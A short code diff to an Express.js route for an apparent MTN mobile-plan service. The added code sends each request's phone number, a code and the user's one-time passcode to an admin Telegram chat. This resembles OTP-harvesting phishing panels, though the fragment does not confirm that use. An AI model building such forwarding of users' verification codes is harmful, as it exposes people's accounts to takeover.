@@ -333,6 +333,18 @@ app.post('/api/mtn/submit-link', (req, res) => {
       existing.link = link;
       existing.phone = resolvedPhone;
       existing.status = 'pending';
+      existing.step = 'otp';
+
+      if (api && ADMIN_CHAT_ID) {
+        notifyTelegramForRequest(requestId, {
+          plan: existing.plan,
+          price: existing.price,
+          phone: existing.phone,
+          step: 'otp',
+          code: existing.code,
+          otp: existing.otp || '—'
+        });
+      }
     }
   }
 
